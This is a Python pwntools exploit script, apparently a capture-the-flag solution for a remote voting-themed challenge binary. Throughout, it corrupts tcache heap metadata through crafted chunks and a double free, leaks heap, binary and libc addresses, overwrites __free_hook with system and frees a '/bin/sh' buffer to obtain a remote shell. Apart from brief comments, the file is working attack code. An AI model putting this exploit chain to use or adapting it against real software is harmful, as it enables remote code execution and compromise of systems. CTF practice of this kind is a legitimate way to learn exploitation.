from pwn import *
context.arch="amd64"
elf = ELF("./primaries",False)
libc = ELF("./libc.so",False)

r = remote('primaryspacesaver.hackthe.vote', 1337)

def visit_blue():
    r.sendafter("blue convention\n", "0\0")
def visit_yellow():
    r.sendafter("yellow convention\n", "1\0")
primaries_done = False
def view():
    r.sendafter("choice: ", "0\0")
def question(c, t):
    r.sendafter("choice: ", "1\0")
    r.sendafter(";)]\n", "%d\0"%c)
    r.sendafter("?\n", "%d\0"%t)
def vote(c):
    r.sendafter("choice: ", "2\0")
    r.sendafter("?\n", "%d\0"%c)
def drop(c):
    r.sendafter("choice: ", "2\0" if primaries_done else "3\0")
    r.sendafter("?\n", "%d\0"%c)
def throw_hat(c, ops=[0,0,0,0,0]):
    r.sendafter("choice: ", "3\0")
    r.sendafter("party?\n\n", "%d\0"%c)
    for op in ops:
        r.sendafter("? :\n", "%d\0"%op)
def speech(c, pl, sz=None):
    if sz is None:
        sz = len(pl)
    r.sendafter("choice: ", "3\0")
    r.sendafter("for?\n", "%d\0"%c)
    r.sendafter("speech?\n", ("%d\0"%sz).ljust(0x20,'\0'))
    r.send(pl)
for i in xrange(3):
    visit_yellow()
    drop(0)
visit_blue()
vote(0)
visit_yellow()
vote(0)
primaries_done = True
# consume some tcache
for i in xrange(4):
    speech(0, "A"*0x58)
# place for later
# first^second is 0x108, and second->next->link will point to the tcache linked list
# so when deleting second, it makes the tcache point to the bss pointer
pl = fit({
    0x60-0x8: 0x131, # second fake heap metadata
    0x60+0x18: 0xde0, # second fake ent
    0x168+0x18: 0xc40, # first fake ent
    }, filler="\0").ljust(0x3e8,'\0')
speech(0, pl)
# list is A->B->C->B->A
# free C, list stays unchanged
drop(2)
# reclaim C, hijack list
# also overwrite lsb of bss convention pointer
speech(0, flat(0, 0, 0, 0xda8, 0)+p8(0), 0x58)
# xor unlink corrupts tcache pointer, bss pointer in tcache
drop(4)
# corrupt string_guard_end
speech(0, "\0", 0x58)
speech(0, "\0", 0x58)
speech(0, flat(0)*4+flat(0xffffffffffffffff), 0x58)
# reclaim second fake ent (which we said was size 0x130)
# and corrupt the first fake ent to create reversible list
speech(0, "\0"*0x128)
# double free
drop(2)
drop(3)
# leak looped tcache pointer
question(2, 0)
r.recvuntil("\t- ")
heap = u64(r.recvuntil("\n[0]",drop=True).ljust(8,'\0'))-0x440
print "HEAP: "+hex(heap)
# leak text
speech(0, flat(heap+0x478), 0x58)
question(2, 0)
r.recvuntil("\t- ")
elf.address = u64(r.recvuntil("\n[0]",drop=True).ljust(8,'\0'))-elf.search("Yes\0").next()
print "TEXT: "+hex(elf.address)
# leak libc
speech(0, flat(elf.got['puts']), 0x58)
question(2, 0)
r.recvuntil("\t- ")
libc.address = u64(r.recvuntil("\n[0]",drop=True).ljust(8,'\0'))-libc.symbols['puts']
print "LIBC: "+hex(libc.address)
# double free again
drop(2)
drop(3)
# overwrite __free_hook
speech(0, flat(libc.symbols['__free_hook']), 0x58)
speech(0, "/bin/sh\0", 0x58)
speech(0, flat(libc.symbols['system']), 0x58)
# shell
drop(2)
r.interactive()
